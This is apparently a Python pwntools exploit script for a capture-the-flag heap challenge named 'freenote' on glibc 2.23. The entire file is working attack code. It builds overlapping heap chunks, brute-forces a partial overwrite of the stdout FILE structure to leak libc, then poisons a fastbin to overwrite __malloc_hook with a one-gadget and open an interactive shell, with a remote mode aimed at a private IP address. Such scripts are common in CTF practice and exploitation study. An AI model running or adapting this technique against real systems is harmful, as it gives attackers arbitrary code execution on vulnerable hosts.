from pwn import *
import sys
from time import time

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./freenote" #2018"
LIBC = "./libc-2.23.so"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)
context.log_level = "debug"

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil("Choice:")

def initnote(conn, l, s):
    recvmenu(conn)
    conn.sendline("1")
    conn.recvuntil("length:")
    conn.send(str(l))
    conn.recvuntil("content:")
    conn.send(s)

def editnote(conn, idx, s):
    recvmenu(conn)
    conn.sendline("2")
    conn.recvuntil("index:")
    conn.send(str(idx))
    conn.recvuntil("content:")
    conn.send(str(s))

def freenote(conn, idx):
    recvmenu(conn)
    conn.sendline("3")
    conn.recvuntil("index:")
    conn.sendline(str(idx))

def exploit(conn, elf, libc, local):
    initnote(conn, 0x80, "A"*0x80) # 0
    freenote(conn, 0)
    initnote(conn, 0x10, "B"*0x10) # 1
    initnote(conn, 0x60, "C"*0x10) # 2

    payload = ""
    payload += "A"*0x10
    payload += p64(0)
    payload += p64(0x21)
    payload += "A"*0x18
    payload += p64(0x31)
    initnote(conn, 0x60, payload) # 3

    initnote(conn, 0x90, "A") # 4
    freenote(conn, 4)

    freenote(conn, 2)

    payload = ""
    payload += "A"*0x18
    payload += p64(0x91)
    editnote(conn, 0, payload)

    freenote(conn, 2)

    brute = 0x2620

    payload = ""
    payload += "A"*0x18
    payload += p64(0x71)
    payload += p16(brute - 0x43) # 2 here is bruteforcible

    editnote(conn, 0, payload)

    initnote(conn, 0x60, "\xdd") # 5

    payload = ""
    payload += "\x00"*3
    payload += p64(0) * 4
    payload += p64(0x81)
    payload += p64(0)
    initnote(conn, 0x60, payload) # 6

    payload = ""
    payload += "A"*0x18
    payload += p64(0x81)
    editnote(conn, 0, payload)

    payload = ""
    payload += "A"*8
    payload += p64(0x21)
    payload += p64(0x21)*8
    editnote(conn, 3, payload)

    initnote(conn, 0x70, "A") # 7
    freenote(conn, 7)

    payload = ""
    payload += "A"*0x18
    payload += p64(0x91)
    editnote(conn, 0, payload)
    freenote(conn, 7)

    payload = ""
    payload += "a"*0x18
    payload += p64(0x81)
    payload += p16(brute - 0x18)
    editnote(conn, 0, payload)

    initnote(conn, 0x70, "\x08") # 8

    payload = ""
    payload += p64(0xfbad2887)
    payload += p64(0)*8
    initnote(conn, 0x70, payload) # 9

    pause()
    conn.sendline("3")
    conn.sendline("4")

    conn.sendline("1")
    conn.sendline(str(0x80))
    conn.sendline("A"*8) # 10

    conn.sendline("1")
    conn.sendline(str(0x80))
    conn.sendline("A"*8) # 11

    conn.sendline("3")
    conn.sendline("10")

    for i in range(70):
        conn.sendline("")

    #for i in range(4):
    #    conn.recvuntil("5. exit\n")

    pause()
    libcleak = u64(conn.recv(8))
    libc.address = libcleak - 0x3c4b78
    log.info("%#x", libc.address)

    payload = ""
    payload += "A"*0x18
    payload += p64(0x71)
    conn.sendline("2")
    conn.sendline("0")
    conn.sendline(payload)
    # editnote(conn, 0, payload)

    conn.sendline("3")
    conn.sendline("2")
    # freenote(conn, 2)

    payload = ""
    payload += p64(libc.address + 0x3c4aed)
    conn.sendline("2")
    conn.sendline("2")
    conn.sendline(payload)
    # editnote(conn, 0, payload)

    conn.sendline("1")
    conn.sendline(str(0x60))
    conn.sendline("A"*8) # 12

    conn.sendline("1")
    conn.sendline(str(0x60))
    payload = ""
    payload += "\x00"*3
    payload += p64(libc.address + 0x85e20)
    payload += p64(libc.address + 0x85a00)
    payload += p64(libc.address + 0x4526a)
    conn.sendline(payload) # 13

    conn.sendline("1")
    conn.sendline("10")
    conn.sendline("10")

    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("192.168.201.16", 13348)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            try:
                exploit(r, elf, libc, local=False)
            except EOFError:
                pause()
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
